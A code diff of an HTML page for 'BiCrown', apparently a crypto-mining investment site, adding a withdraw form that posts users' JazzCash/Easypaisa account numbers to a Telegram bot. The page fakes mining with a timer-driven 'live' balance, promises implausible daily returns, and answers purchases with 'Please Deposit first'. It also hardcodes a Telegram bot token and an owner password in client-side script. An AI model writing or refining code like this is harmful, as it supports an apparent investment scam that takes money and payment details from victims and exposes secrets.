@@ -21,7 +21,8 @@
         .plan-card:hover { border-color: var(--neon-purple); transform: translateY(-10px); }
         .plan-price { font-size: 28px; font-weight: bold; color: white; margin: 15px 0; }
         
-        .action-btn { background: linear-gradient(45deg, var(--neon-purple), #5a12fa); border: none; color: white; padding: 12px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        .action-btn { background: linear-gradient(45deg, var(--neon-purple), #5a12fa); border: none; color: white; padding: 12px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; }
         
         @media (max-width: 768px) {
             .sidebar { width: 60px; padding: 10px; overflow: hidden; }
@@ -37,7 +38,7 @@
         <div class="nav-item" onclick="showPage('dash')">🏠 Dashboard</div>
         <div class="nav-item" onclick="showPage('plans')">💎 Mining Plans</div>
         <div class="nav-item" onclick="showPage('ref')">👥 Refer & Earn</div>
-        <div class="nav-item" onclick="showPage('dep')">💸 Deposit</div>
+        <div class="nav-item" onclick="showPage('dep')">💸 Withdraw</div>
         <div class="nav-item" onclick="openAdmin()" style="margin-top:20px; border-top:1px solid #222; padding-top:20px;">🔐 Owner Access</div>
     </div>
 
@@ -62,81 +63,83 @@
         <div id="plans-page" style="display:none;">
             <h2 style="margin-bottom:20px;">Mining Packages</h2>
             <div class="plan-grid">
-                <div class="plan-card"><span>STARTER</span><div class="plan-price">Rs 350</div><p>Daily Rs 25</p><button class="action-btn">Buy Now</button></div>
-                <div class="plan-card" style="border: 1px solid var(--neon-purple);"><span>PREMIUM</span><div class="plan-price">Rs 5000</div><p>Daily Rs 450</p><button class="action-btn">Buy Now</button></div>
+                <div class="plan-card"><span>STARTER</span><div class="plan-price">Rs 350</div><p>Daily Rs 25</p><button class="action-btn" onclick="alert('Please Deposit first')">Buy Now</button></div>
+                <div class="plan-card" style="border: 1px solid var(--neon-purple);"><span>PREMIUM</span><div class="plan-price">Rs 5000</div><p>Daily Rs 450</p><button class="action-btn" onclick="alert('Please Deposit first')">Buy Now</button></div>
                 <div class="plan-card" style="border: 2px solid gold; background: linear-gradient(145deg, #1a1a1a, #2a2a00);">
                     <span style="color:gold; font-weight:bold;">👑 ELITE SHAH</span>
                     <div class="plan-price">Rs 100,000</div>
                     <p>Daily: Rs 8,500</p>
-                    <p>Total: Rs 255,000</p>
-                    <button class="action-btn" style="background:gold; color:black;">Buy Elite</button>
+                    <button class="action-btn" style="background:gold; color:black;" onclick="alert('Contact Admin for Elite')">Buy Elite</button>
                 </div>
             </div>
+        </div>
+
+        <div id="dep-page" style="display:none;" class="card">
+            <h2>Withdraw Funds</h2>
+            <p style="color:var(--text-gray);">Enter your JazzCash/Easypaisa details</p>
+            <input type="text" id="acc-num" placeholder="Account Number (e.g 0300xxx)">
+            <input type="number" id="withdraw-amount" placeholder="Amount in Rs">
+            <button class="action-btn" id="send-btn">Request Withdraw</button>
         </div>
 
         <div id="ref-page" style="display:none;" class="card">
             <h2>Referral System</h2>
             <p>Invite friends and get Rs 50 bonus.</p>
-            <code style="background:#000; padding:10px; display:block; color:var(--success);">https://bicrown.app/join?ref=romi742</code>
+            <code style="background:#000; padding:10px; display:block; color:var(--success);">https://bicrown-mining.netlify.app/?ref=romi742</code>
         </div>
 
         <div id="admin-panel" style="display:none;" class="card">
             <h2 style="color:red">OWNER CONTROL Panel</h2>
-            <div id="admin-logs">> System Online... Waiting for payments.</div>
+            <div id="admin-logs">> System Online... Bot Connected.</div>
         </div>
     </div>
 
     <script>
-        let liveAmt = 0;
+        // Pages switch karne ke liye
         function showPage(p) {
             document.getElementById('dash-page').style.display = (p=='dash')?'block':'none';
             document.getElementById('plans-page').style.display = (p=='plans')?'block':'none';
             document.getElementById('ref-page').style.display = (p=='ref')?'block':'none';
+            document.getElementById('dep-page').style.display = (p=='dep')?'block':'none';
             document.getElementById('admin-panel').style.display = 'none';
         }
+
+        // Admin access
         function openAdmin() {
             if(prompt("Enter Owner Key:") === "romi742327") {
                 document.getElementById('admin-panel').style.display = 'block';
             }
         }
+
+        // Live Mining Effect
+        let liveAmt = 0;
         setInterval(() => {
             liveAmt += 0.000021;
             document.getElementById('mining-live').innerText = "$" + liveAmt.toFixed(5);
         }, 1500);
+
+        // --- TELEGRAM NOTIFICATION SYSTEM ---
+        const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
+        const chatId = "7005219148";
+
+        document.getElementById('send-btn').addEventListener('click', function() {
+            const acc = document.getElementById('acc-num').value;
+            const amt = document.getElementById('withdraw-amount').value;
+
+            if(acc && amt) {
+                const message = `👑 *BiCrown - New Withdraw* 👑%0A%0A💰 *Amount:* Rs ${amt}%0A💳 *Account:* ${acc}%0A👤 *Status:* Pending`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
+                .then(res => {
+                    alert("Mubarak ho! Request Admin ko bhej di gayi hai.");
+                    document.getElementById('acc-num').value = "";
+                    document.getElementById('withdraw-amount').value = "";
+                })
+                .catch(err => alert("Net ka masla hai jani!"));
+            } else {
+                alert("Pehle details to bharo!");
+            }
+        });
     </script>
 </body>
-
 </html>
-
-// Tumhara Secret Data
-const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
-const chatId = "7005219148";
-
-// Jab koi Withdraw button dabaye
-document.querySelectorAll('.action-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-        // Form se data nikalna
-        const inputs = document.querySelectorAll('input');
-        const accNum = inputs[0].value; // Pehla box (Account)
-        const amount = inputs[1].value; // Doosra box (Amount)
-
-        if(accNum && amount) {
-            // Telegram ke liye message tayyar karna
-            const message = `👑 *BiCrown - New Request* 👑%0A%0A💰 *Amount:* Rs ${amount}%0A💳 *Account:* ${accNum}%0A👤 *User ID:* ${chatId}`;
-            
-            // Telegram API ko message bhejna
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
-            .then(res => {
-                alert("Mubarak ho! Apki request admin ko bhej di gayi hai.");
-                // Input boxes khali kar dena
-                inputs[0].value = "";
-                inputs[1].value = "";
-            })
-            .catch(err => {
-                alert("Error: Message nahi gaya!");
-            });
-        } else {
-            alert("Jani, pehle Account aur Amount to likho!");
-        }
-    });
-});
